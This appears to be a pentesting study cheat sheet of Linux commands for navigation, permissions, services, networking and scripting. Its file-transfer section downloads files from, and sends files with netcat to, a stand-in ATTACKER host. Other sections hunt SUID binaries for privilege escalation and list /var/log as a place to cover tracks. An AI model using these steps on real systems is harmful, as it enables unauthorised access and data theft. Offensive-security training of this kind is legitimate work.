# 🐧 Linux System Administration

> **Scope:** Essential Linux skills for pentesting — navigation, permissions, networking, services, and scripting.

---

## 📋 Essential Commands

### Navigation & File System
```bash
pwd                          # Current directory
ls -la                       # List all files (hidden + permissions)
cd /path/to/dir              # Change directory
find / -name "file" 2>/dev/null  # Search for file
locate filename              # Fast search (uses database)
which command                # Find binary location
file suspicious.bin          # Identify file type
```

### File Operations
```bash
cat file.txt                 # Read file
less file.txt                # Paginated reading
head -n 20 file.txt          # First 20 lines
tail -f /var/log/syslog      # Follow log in real-time
grep -r "password" /var/www/ # Search content recursively
grep -i "error" file.log     # Case-insensitive search
wc -l file.txt               # Count lines
sort file.txt | uniq -c      # Sort and count unique lines
```

### File Permissions
```bash
# Format: rwx rwx rwx = owner group others
chmod 755 file               # rwxr-xr-x
chmod 600 id_rsa             # rw------- (SSH keys)
chmod +x script.sh           # Add execute permission
chown user:group file        # Change ownership

# Special permissions
chmod u+s binary             # SUID (runs as owner)
chmod g+s directory          # SGID (inherit group)
chmod +t /tmp                # Sticky bit (only owner can delete)

# Find SUID binaries (privesc!)
find / -perm -4000 -type f 2>/dev/null
```

---

## 👥 Users & Groups
```bash
# User info
whoami                       # Current user
id                           # UID, GID, groups
cat /etc/passwd              # All users
cat /etc/shadow              # Password hashes (root only)
cat /etc/group               # All groups

# User management
useradd -m newuser           # Create user with home dir
passwd newuser               # Set password
usermod -aG sudo newuser     # Add to sudo group
userdel -r olduser           # Delete user + home

# Switch users
su - username                # Switch user (need password)
sudo -i                      # Root shell (if sudoer)
sudo -l                      # List sudo permissions
```

---

## ⚙️ Services & Processes

### systemd (Service Management)
```bash
systemctl status sshd        # Check service status
systemctl start apache2      # Start service
systemctl stop apache2       # Stop service
systemctl restart nginx      # Restart after config change
systemctl enable sshd        # Start at boot
systemctl disable bluetooth  # Don't start at boot
systemctl list-unit-files --state=enabled  # All enabled services
```

### Process Management
```bash
ps aux                       # All processes from all users, switched to user-oriented format and includes process not attached to terminal
ps aux | grep apache         # Find specific process
top / htop                   # Real-time monitoring
kill PID                     # Graceful stop (SIGTERM)
kill -9 PID                  # Force kill (SIGKILL)
killall processname          # Kill by name
pgrep -a sshd               # Find PID by name

# Background processes
command &                    # Run in background
jobs                         # List background jobs
fg %1                        # Bring job 1 to foreground
nohup command &              # Survives terminal close
```

---

## 🌐 Networking

### Network Configuration
```bash
ip a                         # Show interfaces and IPs
ip r                         # Show routing table
ip link set eth0 up/down     # Enable/disable interface
cat /etc/resolv.conf         # DNS servers
cat /etc/hosts               # Local DNS entries
hostname                     # System hostname
```

### Network Diagnostics
```bash
ping -c 4 target             # Test connectivity
traceroute target            # Trace route to target
dig domain.com               # DNS lookup
nslookup domain.com          # DNS lookup (simpler)
host domain.com              # DNS lookup (simplest)
curl -I http://target        # HTTP headers
wget http://target/file      # Download file
ss -tulnp                    # Lists Open ports and listeners (TCP, UDP, listening sockets, don't resolve service names, processes)
netstat -tulnp               # Same (older systems)
arp -a                       # ARP table
```

### File Transfer
```bash
# Host a file (attacker)
python3 -m http.server 80

# Download (target)
wget http://ATTACKER/file
curl http://ATTACKER/file -o file

# SCP (over SSH)
scp file user@target:/path
scp -r directory user@target:/path
scp user@target:/etc/passwd ./

# Netcat transfer
nc -lvnp 4444 > file         # Receiver
nc ATTACKER 4444 < file      # Sender
```

---

## 📝 Text Processing (Pentest Essential)

```bash
# grep — search patterns
grep "password" file.txt
grep -r "DB_PASS" /var/www/
grep -i "error\|fail" /var/log/auth.log
grep -v "comment"            # Exclude lines

# awk — column extraction
awk '{print $1}' file        # First column
awk -F: '{print $1,$7}' /etc/passwd  # Username and shell
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn  # Top IPs

# sed — find and replace
sed 's/old/new/g' file       # Replace all occurrences
sed -n '5,10p' file          # Print lines 5-10
sed -i 's/password/REDACTED/g' file  # In-place edit

# cut — extract fields
cut -d: -f1 /etc/passwd      # Usernames only
cut -d' ' -f1 access.log    # First field (IPs)

# tr — translate characters
echo "HELLO" | tr 'A-Z' 'a-z'  # Lowercase
cat file | tr -d '\r'        # Remove Windows line endings
```

---

## 📦 Package Management

```bash
# Debian/Ubuntu (apt)
apt update                   # Update package list
apt upgrade                  # Upgrade all packages
apt install nmap             # Install package
apt search wireshark         # Search packages
dpkg -l                      # List installed

# RedHat/CentOS (yum/dnf)
yum update
yum install nmap
rpm -qa                      # List installed
```

---

## 🔧 Bash Scripting Basics

```bash
#!/bin/bash
# Basic script structure

# Variables
TARGET="10.10.10.5"
PORTS="22,80,443"

# Loops
for ip in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$ip > /dev/null 2>&1 && echo "192.168.1.$ip is alive"
done

# Conditionals
if [ -f /etc/shadow ]; then
    echo "Shadow file exists"
fi

# Functions
scan_port() {
    (echo > /dev/tcp/$1/$2) 2>/dev/null && echo "Port $2 open on $1"
}
scan_port $TARGET 22

# Read file line by line
while IFS= read -r line; do
    echo "Processing: $line"
done < targets.txt
```

---

## 💡 Pentest-Relevant Linux Knowledge

| Concept | Why It Matters |
|---------|---------------|
| /etc/passwd & /etc/shadow | User enumeration, hash cracking |
| SUID binaries | Privilege escalation |
| Cron jobs (/etc/crontab) | Persistence, privesc |
| SSH keys (~/.ssh/) | Lateral movement, persistence |
| /proc filesystem | Process info, environment variables |
| /var/log/ | Cover tracks, find credentials |
| Capabilities (getcap) | Privilege escalation |
| /tmp and /dev/shm | World-writable, good for tools |

---

## 🔗 Associated Tools
- [LinPEAS](../../TOOLS/LinPEAS.md) - Automated enumeration
- [Nmap](../../TOOLS/nmap.md) - Network scanning
- [Netcat](../../TOOLS/netcat.md) - Networking swiss army knife
